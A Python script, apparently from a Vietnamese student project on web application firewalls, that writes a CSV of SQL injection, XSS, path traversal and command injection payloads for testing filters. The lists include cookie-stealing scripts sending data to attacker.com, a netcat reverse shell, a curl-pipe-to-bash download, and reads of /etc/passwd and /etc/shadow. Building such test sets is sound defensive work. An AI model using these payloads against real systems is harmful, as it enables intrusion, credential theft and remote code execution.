"""
generate_waf_rules.py
=====================
Tự động sinh file security_payloads.csv chứa các payload tấn công thực tế
phục vụ kiểm thử và xây dựng bộ lọc WAF (Web Application Firewall).

Cột đầu ra:
  - type    : Loại tấn công (SQL_INJECTION, XSS, PATH_TRAVERSAL, CMD_INJECTION)
  - payload : Payload thực tế

Đồ án: Building a Web Security Monitoring, Protection, Detection, and Prevention System
"""

import csv
import os

OUTPUT_FILE = "security_payloads.csv"

# ---------------------------------------------------------------------------
# 1. SQL INJECTION (20 mẫu)
# ---------------------------------------------------------------------------
SQL_INJECTION = [
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1 UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
    "0 UNION SELECT schema_name,NULL FROM information_schema.schemata--",
    "' UNION ALL SELECT NULL,@@version--",
    "' UNION SELECT user(),database()--",
    "1' UNION SELECT 'a','b' INTO OUTFILE '/var/www/html/shell.php'--",
    # Boolean-based
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--",
    "' OR 1=1#",
    "1' AND 1=2--",
    "' AND SUBSTRING(username,1,1)='a'--",
    "' OR 'x'='x",
    "1 AND (SELECT COUNT(*) FROM users)>0--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
]

# ---------------------------------------------------------------------------
# 2. XSS – Cross-Site Scripting (20 mẫu)
# ---------------------------------------------------------------------------
XSS = [
    # Reflected
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "\"><script>alert(document.cookie)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert(1)></iframe>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    # Stored
    "<script>document.write('<img src=http://attacker.com/?c='+document.cookie+'>')</script>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>",
    "<marquee onstart=alert(1)>",
    # DOM-based
    "#<script>alert(1)</script>",
    "?name=<img src=x onerror=alert(1)>",
    "javascript:void(document.write('<script>alert(1)<\\/script>'))",
    "data:text/html,<script>alert(document.domain)</script>",
    # Bypass filter
    "<ScRiPt>alert(1)</sCrIpT>",
    "<%00script>alert(1)</%00script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
]

# ---------------------------------------------------------------------------
# 3. PATH TRAVERSAL (20 mẫu)
# ---------------------------------------------------------------------------
PATH_TRAVERSAL = [
    # Linux
    "../../etc/passwd",
    "../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../../etc/mysql/my.cnf",
    "../../../../../../var/log/apache2/access.log",
    # URL-encoded
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%2F..%2F..%2Fetc%2Fshadow",
    # Double-encoded
    "..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "....//....//etc/passwd",
    "....\/....\/etc/passwd",
    # Windows
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
    "..%5C..%5Cboot.ini",
    "../../windows/win.ini",
    # Null byte & special
    "../../etc/passwd%00",
    "../../etc/passwd%00.jpg",
    "/etc/passwd",
]

# ---------------------------------------------------------------------------
# 4. CMD INJECTION – Command Injection (20 mẫu)
# ---------------------------------------------------------------------------
CMD_INJECTION = [
    # Basic
    "; ls -la",
    "| ls -la",
    "&& ls -la",
    "|| ls -la",
    "` ls -la `",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "&& whoami",
    # Windows
    "& dir",
    "| dir",
    "&& dir",
    "; ping -c 4 attacker.com",
    "| ping -n 4 attacker.com",
    # Obfuscated / advanced
    "$(cat /etc/passwd)",
    "${IFS}cat${IFS}/etc/passwd",
    ";{cat,/etc/passwd}",
    "| nc attacker.com 4444 -e /bin/sh",
    "; curl http://attacker.com/shell.sh | bash",
]

# ---------------------------------------------------------------------------
# Main – ghi ra CSV
# ---------------------------------------------------------------------------
def generate_csv(output_path: str) -> None:
    categories = {
        "SQL_INJECTION": SQL_INJECTION,
        "XSS": XSS,
        "PATH_TRAVERSAL": PATH_TRAVERSAL,
        "CMD_INJECTION": CMD_INJECTION,
    }

    rows = []
    for attack_type, payloads in categories.items():
        for payload in payloads:
            rows.append({"type": attack_type, "payload": payload})

    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["type", "payload"])
        writer.writeheader()
        writer.writerows(rows)

    print(f"[+] Generated: {output_path}")
    print(f"[+] Total payloads: {len(rows)}")

    # Summary per type
    for attack_type, payloads in categories.items():
        print(f"    {attack_type:<20}: {len(payloads)} samples")


if __name__ == "__main__":
    generate_csv(OUTPUT_FILE)
